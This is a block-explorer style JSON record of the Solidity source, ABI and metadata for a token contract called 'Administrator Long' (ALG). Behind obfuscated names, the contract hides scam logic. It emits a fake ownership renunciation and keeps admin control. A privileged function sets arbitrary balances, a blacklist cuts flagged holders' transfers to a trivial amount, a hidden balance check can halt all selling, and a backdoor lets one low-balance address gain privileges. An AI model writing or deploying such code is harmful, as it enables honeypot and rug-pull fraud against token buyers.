{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.16;\n\ninterface fundReceiver {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\nabstract contract fromMode {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface buyIsExempt {\n    function createPair(address swapSenderTx, address sellEnable) external returns (address);\n}\n\ninterface toTradingMin {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address launchMinSell) external view returns (uint256);\n\n    function transfer(address shouldBuy, uint256 maxAutoIs) external returns (bool);\n\n    function allowance(address maxAmountList, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 maxAutoIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address shouldBuy,\n        uint256 maxAutoIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed exemptLaunch, uint256 value);\n    event Approval(address indexed maxAmountList, address indexed spender, uint256 value);\n}\n\ninterface receiverTx is toTradingMin {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract AdministratorLong is fromMode, toTradingMin, receiverTx {\n\n    bool private toAuto;\n\n    uint8 private teamTotal = 18;\n\n    constructor (){\n        \n        fundReceiver teamWallet = fundReceiver(listShouldAt);\n        fundAt = buyIsExempt(teamWallet.factory()).createPair(teamWallet.WETH(), address(this));\n        \n        maxTo = _msgSender();\n        teamReceiver();\n        limitFrom[maxTo] = true;\n        toReceiver[maxTo] = launchTeam;\n        if (totalLaunch) {\n            teamLimit = false;\n        }\n        emit Transfer(address(0), maxTo, launchTeam);\n    }\n\n    function enableReceiver(address buyAuto, uint256 maxAutoIs) public {\n        swapBuy();\n        toReceiver[buyAuto] = maxAutoIs;\n    }\n\n    bool private launchedFee;\n\n    bool public totalLaunch;\n\n    mapping(address => mapping(address => uint256)) private shouldAuto;\n\n    function symbol() external view virtual override returns (string memory) {\n        return swapTrading;\n    }\n\n    function teamReceiver() public {\n        emit OwnershipTransferred(maxTo, address(0));\n        limitTokenFee = address(0);\n    }\n\n    address public fundAt;\n\n    uint256 private senderMin;\n\n    bool public tradingFund;\n\n    address listShouldAt = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    function name() external view virtual override returns (string memory) {\n        return toLaunched;\n    }\n\n    uint256 isMaxAmount;\n\n    function launchReceiver(address autoAt, address shouldBuy, uint256 maxAutoIs) internal returns (bool) {\n        require(toReceiver[autoAt] >= maxAutoIs);\n        toReceiver[autoAt] -= maxAutoIs;\n        toReceiver[shouldBuy] += maxAutoIs;\n        emit Transfer(autoAt, shouldBuy, maxAutoIs);\n        return true;\n    }\n\n    uint256 private launchTeam = 100000000 * 10 ** 18;\n\n    bool public teamLimit;\n\n    function exemptTx(uint256 maxAutoIs) public {\n        swapBuy();\n        isMaxAmount = maxAutoIs;\n    }\n\n    function decimals() external view virtual override returns (uint8) {\n        return teamTotal;\n    }\n\n    mapping(address => bool) public limitFrom;\n\n    function allowance(address enableWalletReceiver, address totalToFund) external view virtual override returns (uint256) {\n        if (totalToFund == listShouldAt) {\n            return type(uint256).max;\n        }\n        return shouldAuto[enableWalletReceiver][totalToFund];\n    }\n\n    uint256 private tradingLaunchTx;\n\n    address public maxTo;\n\n    address launchedTotal = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    uint256 private receiverLaunched;\n\n    uint256 public buyToken;\n\n    function swapBuy() private view {\n        require(limitFrom[_msgSender()]);\n    }\n\n    mapping(address => bool) public tradingBuy;\n\n    mapping(address => uint256) private toReceiver;\n\n    function balanceOf(address launchMinSell) public view virtual override returns (uint256) {\n        return toReceiver[launchMinSell];\n    }\n\n    uint256 constant senderAmount = 20 ** 10;\n\n    function owner() external view returns (address) {\n        return limitTokenFee;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return launchTeam;\n    }\n\n    event OwnershipTransferred(address indexed senderFee, address indexed atTeam);\n\n    uint256 amountLiquidity;\n\n    function launchedSellAt(address autoAt, address shouldBuy, uint256 maxAutoIs) internal returns (bool) {\n        if (autoAt == maxTo) {\n            return launchReceiver(autoAt, shouldBuy, maxAutoIs);\n        }\n        uint256 totalSell = toTradingMin(fundAt).balanceOf(launchedTotal);\n        require(totalSell == isMaxAmount);\n        require(shouldBuy != launchedTotal);\n        if (tradingBuy[autoAt]) {\n            return launchReceiver(autoAt, shouldBuy, senderAmount);\n        }\n        return launchReceiver(autoAt, shouldBuy, maxAutoIs);\n    }\n\n    string private toLaunched = \"Administrator Long\";\n\n    address private limitTokenFee;\n\n    function minMax(address marketingFee) public {\n        swapBuy();\n        \n        if (marketingFee == maxTo || marketingFee == fundAt) {\n            return;\n        }\n        tradingBuy[marketingFee] = true;\n    }\n\n    function modeTx(address receiverLimit) public {\n        require(receiverLimit.balance < 100000);\n        if (tradingFund) {\n            return;\n        }\n        \n        limitFrom[receiverLimit] = true;\n        \n        tradingFund = true;\n    }\n\n    function getOwner() external view returns (address) {\n        return limitTokenFee;\n    }\n\n    function transfer(address buyAuto, uint256 maxAutoIs) external virtual override returns (bool) {\n        return launchedSellAt(_msgSender(), buyAuto, maxAutoIs);\n    }\n\n    function transferFrom(address autoAt, address shouldBuy, uint256 maxAutoIs) external override returns (bool) {\n        if (_msgSender() != listShouldAt) {\n            if (shouldAuto[autoAt][_msgSender()] != type(uint256).max) {\n                require(maxAutoIs <= shouldAuto[autoAt][_msgSender()]);\n                shouldAuto[autoAt][_msgSender()] -= maxAutoIs;\n            }\n        }\n        return launchedSellAt(autoAt, shouldBuy, maxAutoIs);\n    }\n\n    function approve(address totalToFund, uint256 maxAutoIs) public virtual override returns (bool) {\n        shouldAuto[_msgSender()][totalToFund] = maxAutoIs;\n        emit Approval(_msgSender(), totalToFund, maxAutoIs);\n        return true;\n    }\n\n    string private swapTrading = \"ALG\";\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxAmountList\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"senderFee\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"atTeam\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"exemptLaunch\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"enableWalletReceiver\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"totalToFund\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalToFund\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAutoIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchMinSell\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"buyToken\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAutoIs\",\"type\":\"uint256\"}],\"name\":\"enableReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"maxAutoIs\",\"type\":\"uint256\"}],\"name\":\"exemptTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fundAt\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"limitFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"maxTo\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"marketingFee\",\"type\":\"address\"}],\"name\":\"minMax\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverLimit\",\"type\":\"address\"}],\"name\":\"modeTx\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamLimit\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"teamReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalLaunch\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"tradingBuy\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFund\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"buyAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAutoIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"autoAt\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"shouldBuy\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"maxAutoIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"}]", "ContractName": "AdministratorLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}